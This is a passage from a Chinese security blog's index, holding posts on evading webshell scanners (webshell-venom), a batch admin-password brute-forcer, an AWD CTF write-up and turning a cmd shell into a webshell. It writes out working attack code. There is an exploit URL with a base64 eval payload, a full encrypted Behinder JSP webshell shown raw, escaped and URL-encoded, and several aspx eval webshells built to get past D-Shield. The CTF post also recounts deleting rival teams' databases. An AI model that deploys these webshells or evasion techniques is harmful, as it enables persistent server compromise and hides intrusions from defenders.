","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:8:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#更多玩法"},{"categories":["安全工具"],"content":"\r9 不足之处python的base64函数有点傻逼，不会自己检测源文件的编码方式php是世界上最好的语言 我在脚本里用了 chardet 模块来探测可能的编码 但是用了一下发现不能做到百分百正确识别 utf8的没问题，遇到其他编码就容易乱码 如果gbk乱码的话就自己手工base64一遍替换payload吧 ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:9:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#不足之处"},{"categories":["安全工具"],"content":"\r10 项目地址https://github.com/yzddmr6/webshell-venom ","date":"2019-09-03","objectID":"/posts/webshell-venom-3-3/:10:0","series":null,"tags":["webshell-venom"],"title":"webshell-venom 3.3 :利用随机异或免杀任意php文件","uri":"/posts/webshell-venom-3-3/#项目地址"},{"categories":["安全工具"],"content":"\r1 前言当初日学校内网的时候有很多后台，就想着能不能批量检测一下弱口令 但是学校的后台系统种类很多，asp aspx php jsp 等等 因为单个网站的爆破比较好整，直接上burp或者py脚本或者hydra 好像还没有听说过批量工具 想着找一找有没有现成的工具能测一测。 还真发现github上有一个 https://github.com/TideSec/web_pwd_common_crack 好像很厉害的样子 下载下来试了一下，然而结果并不如人意 误报率有百分之六十吧，可以说是非常不理想。 其实目前市面上各种爆破工具并不少 但是要么只能爆破某个指定的管理系统,要么就是不支持批量 所以自己就想着写一个万能网站批量爆破的脚本，并且在一周内进行了简单的实现。 现在博客建立起来了，想着是时候来记录一下。 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:1:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#前言"},{"categories":["安全工具"],"content":"\r2 工具简介webcrack是一款web后台弱口令批量爆破、检测工具。 支持当前各大主流cms管理系统，如dz论坛,织梦,ecshop等。 在url.txt中放入后台地址即可进行自动化检测。 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:2:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#工具简介"},{"categories":["安全工具"],"content":"\r3 思路及过程思路其实挺简单 提取表单 -\u003e 放入数据 -\u003e 发送数据 -\u003e 判断返回内容 但是实现起来的难点主要有两个 1.如何从表单各种奇奇怪怪的参数跟token中准确提取用户名和密码这一栏 2.如何判断是否登录成功 在测试过程中发现原来世界上有那么多叼毛网站。。。 写的非常不规范。。。 想要兼容所有的情况实在很难。 只能采取多种判断策略以及一些折中的办法 尽可能考虑所有可能出现的情况。 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:3:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#思路及过程"},{"categories":["安全工具"],"content":"\r3.1 问题一：如何准确提取账号密码问题1的解决是靠大量测试后总结出来的关键字 从id或者class中提取键名与字典相对比,如果存在关键字即为要爆破的用户名或密码 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:3:1","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#问题一如何准确提取账号密码"},{"categories":["安全工具"],"content":"\r3.2 问题二：如何判断是否登录成功主要精力都放在解决这个问题上，因为不同后台的登录的情况实在是五花八门。 举个例子，有些是登录后给你重定向302到后台 有些是给你重定向到登录失败页面 有些是给你返回个登录成功，然后你要手动去点跳转后台 有些直接返回空数据包。。。 本菜鸡也不会什么机器学习什么深度学习模型。。。 想要通过一个办法是不可能一劳永逸的解决这个问题的。 经过大量的测试，最后使用以下三个办法大大减少了误报率 1. 判断用户名跟密码的键名是否存在在跳转后的页面中 2. error_length 动态检测 3. 关键字黑名单检测 这三个办法是我经过无数次测试才总结出来的经验。。。 经过测试，准确率已经达到了百分之八十。 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:3:2","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#问题二如何判断是否登录成功"},{"categories":["安全工具"],"content":"\r4 更新日志","date":"2019-08-18","objectID":"/posts/webcrack-1/:4:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#更新日志"},{"categories":["安全工具"],"content":"\r4.1 1.0版本 写出demo 减小误报率 增加随机UA头 随机X-Forwarded-For和 随机Client-IP ","date":"2019-08-18","objectID":"/posts/webcrack-1/:4:1","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#10版本"},{"categories":["安全工具"],"content":"\r4.2 1.5 版本 可以通过域名生成动态字典 可以探测系统是否存在因为设计缺陷而造成的万能密码漏洞 代码结构优化，提高性能 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:4:2","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#15-版本"},{"categories":["安全工具"],"content":"\r4.3 2.0 版本 启动多进程，放弃辣鸡多线程 增加special_case，可以识别部分cms，并针对结果采用指定的识别方式 修复reset按钮带来的bug ","date":"2019-08-18","objectID":"/posts/webcrack-1/:4:3","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#20-版本"},{"categories":["安全工具"],"content":"\r5 TO DO 增加简单的验证码识别模块 考虑采用协程的方式优化性能 完善special_case ","date":"2019-08-18","objectID":"/posts/webcrack-1/:5:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#to-do"},{"categories":["安全工具"],"content":"\r6 工具截图截几张图证明一下我不是在瞎BB ","date":"2019-08-18","objectID":"/posts/webcrack-1/:6:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#工具截图"},{"categories":["安全工具"],"content":"\r7 最后这个项目真的是倾注了我很多的心血。 文章中写的简单，然而实际在测试脚本中由于世界上的各种傻屌网站实在是太多了。。。 各种小问题小bug。。。 每个版本自己都会手工调试成百上千次，直到达到稳定。 因为担心公开后网上的hc大佬跟脚本小子用脚本瞎鸡儿乱跑 所以暂时不准备向任何人公开源代码。 ","date":"2019-08-18","objectID":"/posts/webcrack-1/:7:0","series":null,"tags":["webcrack"],"title":"WebCrack:一键自动化日站工具","uri":"/posts/webcrack-1/#最后"},{"categories":["技术文章"],"content":"\r1 背景星盟团队的内部awd训练，邀请我们团队参加，然后想着也没什么事情就报名了。 为什么说叫反杀之旅？ 因为最开始的时候由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。 本来每个队初始分数是1000，结果我们一下变成了0，成了倒数第一。 不过经过团队的紧张的补救以及多年的手速，在多扣了几百分的情况下最后追赶到了正数第二名的位置。 觉得还挺有意思，所以今天写篇博客来记录下过程。 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:1:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#背景"},{"categories":["技术文章"],"content":"\r1.1 比赛规则 比赛时间 八月十四日（今晚）晚六点四十到十点四十 比赛规则 （队长比赛前五分钟找我私聊拿各自的登陆密码并尽快修改） 1.每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接； 2.每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍； 3.选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。 每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮； 4.选手需要保证己方服务的可用性，每次服务不可用，扣除100分；服务检测五分钟一轮； 5.不允许使用任何形式的DOS攻击 因为是awd一般是线下赛，线上的awd确实还是第一次搞。 最开始的时候以为是在他搭建的内网里，还要端口转发到本地才能打，感觉麻烦很多。 后来才发现不是，就是一个外网主机开了很多docker，不同docker在不同的端口，打的时候IP都不用换，直接找端口就可以了。 看了下界面还是挺炫酷的哈哈哈 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:1:1","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#比赛规则"},{"categories":["技术文章"],"content":"\r2 冷静分析拿到ssh后先登上去，改密码，保存源码，D盾扫一扫 虽然我经常发帖子过D盾，但是D盾确实很厉害啊哈哈哈，在比赛中还是非常有用的 老套路，被留了各种后门。 因为本来预定的环境有问题，启用了备用线路，所以只有一个web一个pwn，那就慢慢看吧。 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:2:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#冷静分析"},{"categories":["技术文章"],"content":"\r2.1 第一个后门 任意命令执行文件名 api.inc.php 很多文件都包含有这个文件 authcheckæ¯ä¸ªarray_mapï¼ä¸é¢51è¡åè°ç¨äºè¿ä¸ªauthcheck， 代码意思就是说收到数组authååbase64è§£ç ä¸éï¼ç¶åç¨authcode参数来任意命令执行 那么我们就可以构造以下payload： http://xxxxx/api.inc.php?authcode=assert\u0026auth=ZXZhbCgkX1BPU1RbJ2EnXSk7 auth参数解码后是 eval($_POST['a']); 就可以生成个用蚁剑连接的一句话啦 附一张当时的截图 最开始因为手速快，所有的人都被我们拿了flag ","date":"2019-08-15","objectID":"/posts/one-online-awd/:2:1","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#第一个后门-任意命令执行"},{"categories":["技术文章"],"content":"\r2.2 第二个后门 一句话木马这个没什么说的 后来发现他的$islogin可以随便绕过。。根本不用登陆。。 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:2:2","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#第二个后门--一句话木马"},{"categories":["技术文章"],"content":"\r2.3 第三个后门 LFI\r直接包含flag就可以读取 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:2:3","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#第三个后门--lfi"},{"categories":["技术文章"],"content":"\r2.4 第四个后门 任意文件上传\r主要代码 if ($mod == \"release\"){ echo'\u003cdiv class=\"panel panel-primary\"\u003e\u003cdiv class=\"panel-heading\"\u003e\u003ch3 class=\"panel-title\"\u003e'.$xiaofu.' - 上传安装包\u003c/h3\u003e\u003c/div\u003e\u003cdiv class=\"panel-body\"\u003e'; if ($_POST[\"s\"] == 1) { $extension = explode(\".\",$_FILES[\"file\"][\"name\"]); if (($length = count($extension)) \u003e 1) { $ext = strtolower($extension[$length-1]); } if ($ext == \"png\" || $ext == \"gif\" || $ext == \"jpg\" || $ext == \"jpeg\" || $ext == \"bmp\") {$ext = \"png\"; } copy($_FILES[\"file\"][\"tmp_name\"],ROOT. \"download/release/release.\".$ext); $city=get_ip_city($clientip); $czip=($udata['dlip']); $user=($udata['user']); $DB-\u003equery(\"insert into `auth_log` (`user`,`type`,`date`,`city`,`czip`,`data`) values ('\".$user.\"','上传安装','\".$date.\"','\".$city.\"','\".$czip.\"','无')\"); echo \"成功上传文件!\u003cbr\u003e（请刷新安装包文件夹）\"; } } 意思就是说，收到上传文件后检查后缀，然后保存。 但是仔细看这一句 if ($ext == \"png\" || $ext == \"gif\" || $ext == \"jpg\" || $ext == \"jpeg\" || $ext == \"bmp\") {$ext = \"png\"; } 如果后缀是这么多的一种，那么变量$ext 就被赋值为png 然后if语句就结束了 也就是说他这个判断后缀是没什么卵用的，任意的后缀就可以跳过他这个判断继续往下执行。 但是当时无法利用，因为网站权限被设置为不可写。。。 也就是说你只有ssh才可以更改网站的内容。 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:2:4","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#第四个后门--任意文件上传"},{"categories":["技术文章"],"content":"\r3 马失前蹄因为漏洞都比较简单，很快就看完了。 简单说了一下分工，就让牛逼牛逼最牛逼巨佬naivekun师傅修洞，我们就开始写批量getflag脚本然后批量交flag 结果突然听见naivekun师傅大叫一声卧槽 看积分榜我们居然只有100分 其他队都是1000起步 喵喵喵？？？ 我眼花了吗？？？ 后来问kun师傅怎么修的，他说直接把参数删了。。。 完 蛋，国 赛 重 现 其实研究一下规则就知道，别人打你就扣5分 但是你修炸了就一下扣100。。。 唉，国赛就是这样被坑惨的，做题不少。。。但是越修分数越低。。。 但是也不会掉这么多啊，一下成了倒数第一 后来看群里才知道，由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。 然后我们手速比较快修的比较急，刚好在扣分的第一轮没修好就被扣分了 赶紧把洞重新修了一遍 gg，跟别的队差1000分还打个毛啊 猛男落泪.jpg ","date":"2019-08-15","objectID":"/posts/one-online-awd/:3:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#马失前蹄"},{"categories":["技术文章"],"content":"\r4 搅屎翻盘之旅不过这个比赛有一点好处就是时间长，5分钟一轮，四个小时。 算了算我们还是有翻盘的机会的 毕竟手速快，顺便稳定了权限，基本上当时所有队伍的权限都在我们手里。 分工了一下 一个人稳定权限拿flag，一个人写批量脚本交flag，一个人搅屎。 pwn跟web是分开的，也差不多这个样子 当时自己批量getflag的截图 这是一个洞的脚本，多的图就没截了 然后慢慢分数就涨了上去，倒数第二还是第三吧 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:4:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#搅屎翻盘之旅"},{"categories":["技术文章"],"content":"\r4.1 删库跑路只靠得分不行，因为分差太小了，一轮全部拿到其他队伍的flag还没有扣得多 所以就想着搅屎 因为别人扣分实际上就相当于自己队伍得分 搅屎本来想删站的，结果没权限，就少了很多乐趣。 然后想着能不能fork炸弹啊磁盘写满啊这种 后来naivekun师傅发现可以删库让整个站500 哈哈哈哈快乐 删库跑路图： 被群里人发现了 基本上把大多数队伍的库都删了个遍 但是我们后来发现 删库居然不扣分？？？ 在群里问技术 原来check扣分异常。。。所以技术直接把check关了。。。 好的吧，反正继续搅屎没毛病 然后写个循环脚本，继续删库。。 pwn也开始搅屎了 附上队员blackbinary的犯罪证据 直接echo fuckyou到二进制文件里 这样其他队伍就无法攻击得到flag ","date":"2019-08-15","objectID":"/posts/one-online-awd/:4:1","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#删库跑路"},{"categories":["技术文章"],"content":"\r5 逐渐回暖后来因为搅屎比赛太过激烈 我们的队伍分数在逐渐往上涨，其他大多数被删库就在往下掉 最后就也不想打了，全部是自动化getflag，自动化提交了，大家也都自己干自己的事去了。 附上几张当时的截图 随机队名，我们是Colombia队 第三了 然后第二了 最后结果，第二名 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:5:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#逐渐回暖"},{"categories":["技术文章"],"content":"\r6 后续在多扣1000分的情况下从倒数第一反杀到第二 最后说给我们分数加上但是也没加，毕竟训练赛就当打着玩 还是挺好玩的，但是中途平台bug比较多 什么flag提交不上，提交频率过快 然而最让我懵逼的是 他平台有漏洞 每个队伍的cookie居然只是队伍名的md5。。。 阿伟死了 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:6:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#后续"},{"categories":["技术文章"],"content":"\r7 最后总结一下反杀的原因还是主要靠搅屎，让其他队伍扣分 不然快1000分的分差靠只有5分一个的flag很难追上 不管怎么说这个线上awd还是挺有趣的 操作虽然都是常规操作，但也是对团队分工合作，搅屎技术的一次综合考验 特地写下这篇文章记录一下。 ","date":"2019-08-15","objectID":"/posts/one-online-awd/:7:0","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#最后"},{"categories":["技术文章"],"content":"\r7.1 小插曲\r喵喵喵？？？ ","date":"2019-08-15","objectID":"/posts/one-online-awd/:7:1","series":null,"tags":["CTF","AWD"],"title":"记一次AWD反杀之旅","uri":"/posts/one-online-awd/#小插曲"},{"categories":["技术文章"],"content":" 2019-7-11 自己发在土司的文章 ","date":"2019-08-12","objectID":"/posts/cmd2bx/:0:0","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#"},{"categories":["技术文章"],"content":"\r1 前言前一段时间致远OA的洞坑了不少公司 自己也复现了一下 但是有个很恶心的问题就是 默认的payload是有长度限制的并且只是一个cmd的shell Linux的shell还比较灵活 但是win的来说就不太方便了 特别是配合上恶心的url编码在浏览器里面遇到反斜杠就gg 那么怎么把cmdshell优雅的转化为可以连接的一句话呢 看了以前的帖子大概有这几个办法 Js+cscript Certutil +base64 Win7以上还有bitsadmin Ps 等等等等 Bitsadmin就不说了 Certutil跟cscript远程下载其实也不错 但是有两个问题 1 如果主机不通外网就gg 2 360会拦截 综合来说都有自己的不足之处 还是一句话echo最稳了 自己也研究了一下 但是用echo写马有两个天坑 ","date":"2019-08-12","objectID":"/posts/cmd2bx/:1:0","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#前言"},{"categories":["技术文章"],"content":"\r1.1 1.win的尖括号转义\rWin的尖括号要用^来转义而不是反斜杠 如果你要是放到引号里会把引号一起打印出来 ","date":"2019-08-12","objectID":"/posts/cmd2bx/:1:1","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#1win的尖括号转义"},{"categories":["技术文章"],"content":"\r1.2 2. 沙雕url编码https://www.cnblogs.com/i80386/p/4576699.html 大家可以自己去网上找一下帖子到底url编码有多混乱。。。。 这里就说说python的requests模块的url编码 经过测试 空格=\u003e%20 %空格=\u003e%%20 %20=\u003e%20 也就是说 他在默认遇到百分号开头的字符串的时候 request模块会把它当做已经编码过的字符 直接发送过去 但是他就带来个问题不会自动编码百分号 所以你只把尖括号跟百分号转义过后的payload放到py脚本里还是不能正常执行 这里偷了个懒直接找的在线网站，把它编码一遍再放到python里 http://tool.chinaz.com/tools/urlencode.aspx ","date":"2019-08-12","objectID":"/posts/cmd2bx/:1:2","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#2-沙雕url编码"},{"categories":["技术文章"],"content":"\r2 综上：原来payload（冰蝎为例） \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%\u003e 尖括号转义=\u003e ^\u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%^\u003e^\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^\u003e^\u003c%if(request.getParameter(\"pass\")!=null){String k=(\"\"+UUID.randomUUID()).replace(\"-\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^\u003e url编码=\u003e %5e%3c%25%40page+import%3d%22java.util.*%2cjavax.crypto.*%2cjavax.crypto.spec.*%22%25%5e%3e%5e%3c%25!class+U+extends+ClassLoader%7bU(ClassLoader+c)%7bsuper(c)%3b%7dpublic+Class+g(byte+%5b%5db)%7breturn+super.defineClass(b%2c0%2cb.length)%3b%7d%7d%25%5e%3e%5e%3c%25if(request.getParameter(%22pass%22)!%3dnull)%7bString+k%3d(%22%22%2bUUID.randomUUID()).replace(%22-%22%2c%22%22).substring(16)%3bsession.putValue(%22u%22%2ck)%3bout.print(k)%3breturn%3b%7dCipher+c%3dCipher.getInstance(%22AES%22)%3bc.init(2%2cnew+SecretKeySpec((session.getValue(%22u%22)%2b%22%22).getBytes()%2c%22AES%22))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b%25%5e%3e 然后写个轮子 就可以批量cmd转一句话啦 写了个脚本 支持批量检测跟单个检测 如果是 http:// 开头的就识别成单个 xxx.txt就是批量 需要设置一下脚本里面的cmdshell地址跟密码 ","date":"2019-08-12","objectID":"/posts/cmd2bx/:2:0","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#综上"},{"categories":["技术文章"],"content":"\r3 项目地址：https://github.com/yzddmr6/cmd2bx TCV: 0 ","date":"2019-08-12","objectID":"/posts/cmd2bx/:3:0","series":null,"tags":["python"],"title":"如何优雅的把cmdshell升级为一句话","uri":"/posts/cmd2bx/#项目地址"},{"categories":["安全工具"],"content":" 2019-7-15 自己发在土司的文章 ","date":"2019-08-12","objectID":"/posts/webshell-venom/:0:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#"},{"categories":["安全工具"],"content":"\r1 前言最近逛帖子发现好多人还在找各种免杀一句话。。。 都9102年了 都不知道有webshell-venom这个东西吗。。。 看来我的宣传还是不到位。。。 再给大家介绍一下吧 ","date":"2019-08-12","objectID":"/posts/webshell-venom/:1:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#前言"},{"categories":["安全工具"],"content":"\r1.1 项目地址：https://github.com/yzddmr6/webshell-venom ","date":"2019-08-12","objectID":"/posts/webshell-venom/:1:1","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#项目地址"},{"categories":["安全工具"],"content":"\r1.2 蚁剑插件版：https://github.com/yzddmr6/as_webshell_venom 自己几个月前做的项目，一直到现在照样吊打各路防火墙(静态扫描) 各类型免杀截图 ","date":"2019-08-12","objectID":"/posts/webshell-venom/:1:2","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#蚁剑插件版"},{"categories":["安全工具"],"content":"\r2 使用方法\r","date":"2019-08-12","objectID":"/posts/webshell-venom/:2:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#使用方法"},{"categories":["安全工具"],"content":"\r3 说明文档因为写的太多了 全部放在doc下面 包含了免杀脚本编写的思路以及一些小技巧 需要的自取 https://github.com/yzddmr6/webshell-venom/tree/master/doc ","date":"2019-08-12","objectID":"/posts/webshell-venom/:3:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#说明文档"},{"categories":["安全工具"],"content":"\r4 后言我看到有很多waf的厂商已经关注了我的github 本来开始项目名字叫php_xor_bypass只是php免杀脚本 后来增加了asp aspx类型 webshell-venom 1.0 的时候不到一周就被D盾查杀了 现在是200个星，等到300个星放出下一个版本 ","date":"2019-08-12","objectID":"/posts/webshell-venom/:4:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#后言"},{"categories":["安全工具"],"content":"\r5 禁止用于非法用途！","date":"2019-08-12","objectID":"/posts/webshell-venom/:5:0","series":null,"tags":["免杀","webshell-venom"],"title":"一键吊打D盾(免杀一句话无限生成)","uri":"/posts/webshell-venom/#禁止用于非法用途"},{"categories":["技术文章"],"content":" 2019-7-15 自己发在土司的文章 ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:0:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#"},{"categories":["技术文章"],"content":"\r1 前言自己曾经写过一篇文章:利用随机异或无限免杀某盾 php的webshell免杀方法有很多,但是市面上很少有讲aspx免杀的文章. 因为aspx的权限一般较大,对于渗透过程中还是很重要的, 所以就想着写一篇文章来简单的介绍下aspx的免杀 ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:1:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#前言"},{"categories":["技术文章"],"content":"\r2 0x01 主要方法 字符串拼接 函数 数组 Base64编码 ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:2:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x01-主要方法"},{"categories":["技术文章"],"content":"\r3 0x02 了解aspx一句话Aspx的一句话一般是使用Jscript语言实现 看看原本的菜刀aspx一句话 \u003c%@ Page Language=\"Jscript\"%\u003e \u003c%eval(Request.Item[\"pass\"],\"unsafe\");%\u003e 其实与php的类似 Eval函数将字符串当做代码执行 不同的是在Jscript中为了安全起见必须使用unsafe参数,才可以使其具有对操作系统操作的功能 Request.Item[“pass”] 的pass就是接受的参数 类似于php的$_POST[“pass”] ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:3:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x02--了解aspx一句话"},{"categories":["技术文章"],"content":"\r3.1 Jscript基本用法 Function xxx(){}//声明一个函数 ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:3:1","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#jscript基本用法"},{"categories":["技术文章"],"content":"\r3.2 字符串拼接 Var a =’a’+’b’;//a=’ab’; Var a= ‘\\x61’; //a=’a’; ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:3:2","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#字符串拼接"},{"categories":["技术文章"],"content":"\r3.3 数组声明 Var a=’abc’; Var b=a(0);//b=’a’; 作为免杀来说一般waf杀的都是unsafe这个参数,所以我们的免杀也将从这个参数下手 ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:3:3","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#数组声明"},{"categories":["技术文章"],"content":"\r4 0x02 字符串拼接经过测试,一般来说把’unsafe’这个字符串无论是十六进制拼接还是直接大小写拼接均不可行 于是想到可以采用substr函数 \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var a=Request.Form(\"mr6\"); var b='aaaunsaaaafe'; var b=b.substr(3,4)+b.substr(10); eval(a,b); %\u003e ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:4:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x02-字符串拼接"},{"categories":["技术文章"],"content":"\r5 0x03 数组感觉大多数waf对数组拼接并不感冒,就可以打乱顺序,利用数组进行拼接 \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var a='efasnu'; var b=Request.Form(\"mr6\"); var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0); eval(b,c); %\u003e ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:5:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x03-数组"},{"categories":["技术文章"],"content":"\r6 0x04 函数因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可 \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var a=Request.Form(\"mr6\"); function ok() { var c=\"un\"; var b=\"safe\"; return c+b; } eval(a,ok()); %\u003e ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:6:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x04-函数"},{"categories":["技术文章"],"content":"\r7 0x05 BASE64编码Php中经常使用base64编码来bypass,那么在aspx中如何实现呢 var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(‘eXpkZG1yNg==’);//res=’yzddmr6’; 那么我们对于unsafe这个特征就可以使用base64编码来绕过 \u003c%@ Page Language=\"Jscript\" Debug=true%\u003e \u003c% var a=Request.Form(\"mr6\"); var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String('dW5zYWZl')); eval(a,res); %\u003e ","date":"2019-08-11","objectID":"/posts/webshell-venom-aspx/:7:0","series":null,"tags":["免杀","webshell-venom"],"title":"无限免杀D盾脚本之aspx","uri":"/posts/webshell-venom-aspx/#0x05-base64编码"},{"categories":["技术文章"],"content":"\r8 0x06 总结可能是因为aspx的免杀现在还不是很多,所以waf的查杀并不是很严格,不需要太复杂就可以绕过. 